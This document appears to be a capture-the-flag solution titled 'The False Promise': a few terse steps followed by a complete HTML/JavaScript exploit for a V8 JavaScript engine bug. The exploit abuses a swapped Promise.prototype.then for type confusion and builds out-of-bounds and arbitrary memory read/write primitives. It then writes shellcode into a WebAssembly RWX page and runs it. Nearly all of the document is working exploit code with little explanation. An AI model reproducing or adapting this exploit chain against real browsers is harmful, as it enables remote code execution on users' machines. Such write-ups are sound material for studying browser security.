The False Promise
=================

1. swap promise prototype then to trigger type confusion
2. play with heap so that JSArray's length will overlap with promise reaction and the status field (out of bounds of the array object) is null. just trial and error.
3. this gives oobrw, no point in explaining further 


```
<html>
<head>
	</head>
	<body>
		<script>

let conversion_buffer = new ArrayBuffer(8);
let float_view = new Float64Array(conversion_buffer);
let int_view = new BigUint64Array(conversion_buffer);
BigInt.prototype.hex = function() {
    return '0x' + this.toString(16);
};
BigInt.prototype.i2f = function() {
    int_view[0] = this;
    return float_view[0];
}
BigInt.prototype.smi2f = function() {
    int_view[0] = this << 32n;
    return float_view[0];
}
Number.prototype.f2i = function() {
    float_view[0] = this;
    return int_view[0];
}
Number.prototype.f2smi = function() {
    float_view[0] = this;
    return int_view[0] >> 32n;
}

Number.prototype.fhw = function() {
    float_view[0] = this;
    return int_view[0] >> 32n;
}

Number.prototype.flw = function() {
    float_view[0] = this;
    return int_view[0] & BigInt(2**32-1);
}

Number.prototype.i2f = function() {
    return BigInt(this).i2f();
}
Number.prototype.smi2f = function() {
    return BigInt(this).smi2f();
}

function hex(a) {
    return a.toString(16);
}

function get_wasm_func() {
    var importObject = {
        imports: { imported_func: arg => console.log(arg) }
    };
    bc = [0x0, 0x61, 0x73, 0x6d, 0x1, 0x0, 0x0, 0x0, 0x1, 0x8, 0x2, 0x60, 0x1, 0x7f, 0x0, 0x60, 0x0, 0x0, 0x2, 0x19, 0x1, 0x7, 0x69, 0x6d, 0x70, 0x6f, 0x72, 0x74, 0x73, 0xd, 0x69, 0x6d, 0x70, 0x6f, 0x72, 0x74, 0x65, 0x64, 0x5f, 0x66, 0x75, 0x6e, 0x63, 0x0, 0x0, 0x3, 0x2, 0x1, 0x1, 0x7, 0x11, 0x1, 0xd, 0x65, 0x78, 0x70, 0x6f, 0x72, 0x74, 0x65, 0x64, 0x5f, 0x66, 0x75, 0x6e, 0x63, 0x0, 0x1, 0xa, 0x8, 0x1, 0x6, 0x0, 0x41, 0x2a, 0x10, 0x0, 0xb];
    wasm_code = new Uint8Array(bc);
    wasm_mod = new WebAssembly.Instance(new WebAssembly.Module(wasm_code), importObject);
    return wasm_mod;
}

let wasm_inst = get_wasm_func();
wfunc = wasm_inst.exports.exported_func;
shellcode = unescape("%u3b6a%u9958%ubb48%u622f%u6e69%u732f%u0068%u4853%ue789%u2d68%u0063%u4800%ue689%ue852%u000f%u0000%u2f2e%u6c66%u6761%u705f%u6972%u746e%u7265%u5600%u4857%ue689%u050f")
//  traverse the JSFunction object chain to find the RWX WebAssembly code page


let swap = Promise.prototype.then;
let then_counter= 0;
function thenable(x,y){ console.log("sice");x(); };
function custom_thenable_getter(x,y){ 
    then_counter+=1;
    console.log("getter called #"+then_counter);
    if(then_counter > 1){
        Promise.prototype.then = thenable;
    }
    
    return swap;
};

Object.prototype.__defineGetter__("then",custom_thenable_getter)
let junk = [111,1,23,,,]
let victim = [1.1]

const promise = new Promise((resolve, reject) => { resolve(victim); });

setTimeout(() => {

//%DebugPrint(victim);
var corrupt_me = [-1.1885960025192367e+148,1.1,1.1,1.1,1.1];
var float_carw  = [6.6]
var uint64_aarw = new BigUint64Array(4);
var obj_leaker ={      
	a: corrupt_me,
	b: corrupt_me,
};

const float_carw_elements_offset = 0x14;

for(var i = 0; i< 100; i++){
	console.log(i +"->" + hex(victim[i].f2i()))
}
const corrupt_me_ofs = 78;
//%DebugPrint(corrupt_me)
console.log(hex((victim[corrupt_me_ofs]).f2i()))
victim[corrupt_me_ofs] =  (0x10000000000n+ ((victim[corrupt_me_ofs]).f2i())).i2f();
//%DebugPrint(corrupt_me)
console.log(corrupt_me.length)

let hi = [1234]
// reads 4 bytes from the compressed heap at the specified dword offset after float_rel
function crel_read4(offset) {
    qw_offset = Math.floor(offset / 2);
    if (offset & 1 == 1) {
        return corrupt_me[qw_offset].fhw();
    } else {
        return corrupt_me[qw_offset].flw();
    }
}

function crel_write4(offset, val) {
    qw_offset = Math.floor(offset / 2);
    // we are writing an 8-byte double under the hood
    // read out the other half and keep its value
    if (offset & 1 == 1) {
        temp = corrupt_me[qw_offset].flw();
        new_val = (val << 32n | temp).i2f();
        corrupt_me[qw_offset] = new_val;
    } else {
        temp = corrupt_me[qw_offset].fhw();
        new_val = (temp << 32n | val).i2f();
        corrupt_me[qw_offset] = new_val;
    }
}

function cabs_read4(caddr) {
    elements_addr = caddr - 8n | 1n;
    crel_write4(float_carw_elements_offset, elements_addr);
    console.log('cabs_read4: ', hex(float_carw[0].f2i()));
    res = float_carw[0].flw();
    // TODO restore elements ptr
    return res;
}

function cabs_read8(caddr) {
    elements_addr = caddr - 8n | 1n;
    crel_write4(float_carw_elements_offset, elements_addr);
    console.log('cabs_read8: ', hex(float_carw[0].f2i()));
    res = float_carw[0].f2i();
    // TODO restore elements ptr
    return res;
}

function cabs_write4(caddr, val) {
    elements_addr = caddr - 8n | 1n;

    temp = cabs_read4(caddr + 4n | 1n);
    //console.log('cabs_write4 temp: ', hex(temp));

    new_val = (temp << 32n | val).i2f();

    crel_write4(float_carw_elements_offset, elements_addr);
    //console.log('cabs_write4 prev_val: ', hex(float_carw[0].f2i()));

    float_carw[0] = new_val;
    // TODO restore elements ptr
    return res;
}

const objleaker_offset = 67;
const uint64_externalptr_offset = 28;     // in 8-bytes
function addrof(o) {
    obj_leaker.b = o;
    addr = crel_read4(objleaker_offset) & BigInt(2**32-2);
    obj_leaker.b = {};
    return addr;
}


function read8(addr) {
    faddr = addr.i2f();
    t1 = corrupt_me[uint64_externalptr_offset];
    t2 = corrupt_me[uint64_externalptr_offset + 1];
    corrupt_me[uint64_externalptr_offset] = faddr;
    corrupt_me[uint64_externalptr_offset + 1] = 0.0;

    val = uint64_aarw[0];

    corrupt_me[uint64_externalptr_offset] = t1;
    corrupt_me[uint64_externalptr_offset + 1] = t2;
    return val;
}

// Arbitrary write. We corrupt the backing store of the `uint64_aarw` array and then write into the array
function write8(addr, val) {
    faddr = addr.i2f();
    t1 = corrupt_me[uint64_externalptr_offset];
    t2 = corrupt_me[uint64_externalptr_offset + 1];
    corrupt_me[uint64_externalptr_offset] = faddr;
    corrupt_me[uint64_externalptr_offset + 1] = 0.0;

    uint64_aarw[0] = val;

    corrupt_me[uint64_externalptr_offset] = t1;
    corrupt_me[uint64_externalptr_offset + 1] = t2;
    return val;
}

// Given an array of bigints, this will write all the elements to the address provided as argument
function writeShellcode(addr, sc) {
    faddr = addr.i2f();
    t1 = corrupt_me[uint64_externalptr_offset];
    t2 = corrupt_me[uint64_externalptr_offset + 1];
    corrupt_me[uint64_externalptr_offset - 1] = 10;
    corrupt_me[uint64_externalptr_offset] = faddr;
    corrupt_me[uint64_externalptr_offset + 1] = 0.0;

    for (var i = 0; i < sc.length; ++i) {
        uint64_aarw[i] = sc[i]
    }

    corrupt_me[uint64_externalptr_offset] = t1;
    corrupt_me[uint64_externalptr_offset + 1] = t2;
}


let previous_elements = crel_read4(float_carw_elements_offset);
console.log(hex(previous_elements));

//
//%DebugPrint(corrupt_me);
//%DebugPrint(uint64_aarw.buffer);



for(var i = 0x0; i <0x40; i++){
	var tmp = crel_read4(i);
	console.log(i + " -> "+ hex(tmp))
	
}



let wasm_inst_addr = addrof(wasm_inst);
console.log(hex(wasm_inst_addr));

//%DebugPrint(wasm_inst)


let rwx_addr = cabs_read8(wasm_inst_addr + 0x68n);
//console.log('rwx_addr: ' + hex(rwx_addr));

// write the shellcode to the RWX page
while(shellcode.length % 4 != 0){
    shellcode += "\u9090";
}

let sc = [];

// convert the shellcode to BigInt
for (let i = 0; i < shellcode.length; i += 4) {
    sc.push(BigInt(shellcode.charCodeAt(i)) + BigInt(shellcode.charCodeAt(i + 1) * 0x10000) + BigInt(shellcode.charCodeAt(i + 2) * 0x100000000) + BigInt(shellcode.charCodeAt(i + 3) * 0x1000000000000));
}

writeShellcode(rwx_addr,sc);
wfunc();

}, 3000);


		</script>
	</body>
</html>
```
